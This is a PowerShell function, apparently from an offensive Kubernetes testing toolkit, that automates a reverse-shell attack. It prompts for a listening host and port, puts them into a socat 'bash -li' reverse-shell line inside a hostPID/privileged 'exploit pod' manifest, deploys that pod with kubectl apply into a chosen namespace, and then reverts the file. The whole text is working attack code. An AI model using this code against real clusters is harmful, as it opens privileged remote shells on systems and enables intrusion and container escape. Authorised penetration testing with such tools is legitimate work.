function Perform-Reverseshell {
    param(
        [Parameter(Mandatory = $true)]
        [string]$namespace,
        [Parameter(mandatory = $true)]
        [string]$resource
    )            
    Write-Host "no exec and rigths we can try a reverse shell interested"
    $yesOrNo = Get-YesOrNoInput
    if(-not $yesOrNo){
        return;
    }

        # Read user input for host and port
    $hostreverse = Read-Host "Please enter the host to reverse shell to"
    $port = Read-Host "Please enter the port which is listening"

    $filePath = "$PSScriptRoot/../../Exploitpods/hostpidAndprivileged/$resource/hostpid-privileged-revshell-$resource.yaml"

    # Read the original content of the file
    $originalContent = Get-Content -Path $filePath

    # Create a new array to store the modified content
    $modifiedContent = @()

    # Define a pattern that matches lines containing "socat exec"
    $pattern = '^(.*socat exec:).*'

    # Process each line, replacing those that match the pattern
    foreach ($line in $originalContent) {
        if ($line -match $pattern) {
            # Capture and retain the leading whitespace
            $indentation = $matches[1]
            # Create a replacement line with the same indentation
            $replacement = "${indentation}'bash -li',pty,stderr,setsid,sigint,sane tcp:${hostreverse}:$port`"]"
            write-Host $replacement
            $modifiedContent += $replacement
        } else {
            $modifiedContent += $line
        }
    }

    # Write the temporary changes to the file
    $modifiedContent | Set-Content -Path $filePath

    # Inform the user that the file has been temporarily modified
    Write-Host "The file has been temporarily modified."

    # Execute your command here (e.g., kubectl apply)
    # Note: Ensure kubectl is accessible and configured properly for this script to work
    try {
        kubectl apply -f $filePath -n $namespace
        Write-Host "kubectl apply executed successfully." -ForegroundColor Green
    } catch {
        Write-Host "Error executing kubectl apply: $_" -ForegroundColor Red
    }

    # Revert the file content to the original
    $originalContent | Set-Content -Path $filePath

    # Inform the user that the file has been reverted to its original state
    Write-Host "The changes have been reverted. The file is now back to its original state." -ForegroundColor Green
}